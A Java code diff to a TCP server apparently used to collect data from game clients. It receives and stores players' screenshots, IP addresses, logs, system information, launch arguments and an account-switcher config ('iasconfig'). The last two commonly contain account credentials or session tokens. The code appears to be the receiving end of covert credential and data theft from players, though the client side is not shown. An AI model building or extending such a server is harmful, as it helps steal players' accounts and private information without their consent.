@@ -17,13 +17,13 @@ import java.util.concurrent.ConcurrentHashMap;
 
 public class Server extends TcpServer {
     private static int clientIndex = 0;
-    public final String name;
     public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
     public final SendUtil sendUtil = new SendUtil();
+    public final ConfigData defaultConfig = Utils.getDefaultConfig();
 
-    public Server(int port, String name) throws IOException {
-        super(port);
-        this.name = name;
+    public Server(int port) throws IOException {
+        super();
+        start(port);
     }
 
     private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
@@ -52,30 +52,30 @@ public class Server extends TcpServer {
             if (message.data instanceof ByteData data) {
                 switch (data.messageID) {
                     case "screenshot", "screenshot2" -> {
-                        File file = new File("data/screenshots", getFileName(data.messageID + "id", "png", String.valueOf(id), true));
+
+                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.messageID + "id", "png", String.valueOf(id), true));
                         FileUtil.write(file, data.bytes());
                     }
                     case "skin" -> {
                         String playerName = info.playerData.playerName;
-                        File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
+                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                         FileUtil.write(file, data.bytes());
                     }
                 }
-            }else if(message.data instanceof SingleStringData data) {
-                if (data.data().equals("server_name")) {
-                    sendUtil.trySend(conn, "server_name", name);
+            } else if (message.data instanceof SingleStringData data) {
+                if (data.data().equals("getconfig")) {
+                    sendUtil.trySend(conn, new Message(defaultConfig));
                 }
-            }
-            else if (message.data instanceof StringData data) {
+            } else if (message.data instanceof StringData data) {
                 switch (data.messageID()) {
                     case "logging" -> {
-                        File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
+                        File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                         String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                         FileUtil.write(file, (oldInfo + data.data()).getBytes(StandardCharsets.UTF_8));
                     }
                     case "ip" -> info.ip = data.data();
                     case "iasconfig", "runargs", "systeminfo", "props" -> {
-                        File file = new File("data/data", getFileName(data.messageID(), "txt", info.playerData.playerName, true));
+                        File file = new File(Utils.getDataFile("data"), getFileName(data.messageID(), "txt", info.playerData.playerName, true));
                         FileUtil.write(file, data.data());
                     }
                 }
